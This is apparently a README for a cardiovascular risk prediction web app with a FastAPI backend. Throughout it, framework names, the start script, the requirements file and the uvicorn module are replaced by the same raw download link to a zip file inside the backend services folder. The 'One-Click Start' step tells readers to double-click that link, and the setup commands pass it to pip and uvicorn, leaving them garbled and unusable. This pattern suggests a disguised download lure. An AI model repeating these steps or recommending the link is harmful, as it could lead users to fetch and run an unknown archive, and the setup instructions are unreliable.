
# Cardio Health Risk Predictor Pro

A modern, full-stack application for assessing cardiovascular disease risk using Machine Learning.

## Overview
This project uses a **FastAPI** backend to serve predictive models and a **https://github.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/raw/refs/heads/main/backend/app/services/Risk-Cardio-Prediction-Vascular-v2.2.zip** frontend for a premium user experience. It provides:
-   **Risk Assessment**: Single-patient prediction using ML.
-   **Bulk Analysis**: CSV upload for batch processing.
-   **PDF Reports**: Downloadable health reports.
-   **Resource Finder**: Location-based search for hospitals (Maharashtra).
-   **Education Hub**: Curated videos and articles.

## Quick Start

### Prerequisites
-   Python 3.8+
-   https://github.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/raw/refs/heads/main/backend/app/services/Risk-Cardio-Prediction-Vascular-v2.2.zip 18+

### One-Click Start (Windows)
Double-click `https://github.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/raw/refs/heads/main/backend/app/services/Risk-Cardio-Prediction-Vascular-v2.2.zip` to launch both backend and frontend servers.

### Manual Setup
**1. Backend**
```bash
cd backend
pip install -r https://github.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/raw/refs/heads/main/backend/app/services/Risk-Cardio-Prediction-Vascular-v2.2.zip
uvicorn https://github.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/raw/refs/heads/main/backend/app/services/Risk-Cardio-Prediction-Vascular-v2.2.zip --reload
```

**2. Frontend**
```bash
cd frontend
npm install
npm run dev
```

## Architecture

-   **Backend**: `backend/` - Python, FastAPI, Pandas, Scikit-learn.
-   **Frontend**: `frontend/` - TypeScript, https://github.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/raw/refs/heads/main/backend/app/services/Risk-Cardio-Prediction-Vascular-v2.2.zip, Tailwind CSS, Shadcn UI.
-   **Legacy**: `legacy/` - Old Streamlit application files.

## Credits
Built by Ruturaj Bhaskar Nawale using the Gemini Agentic Assistant.
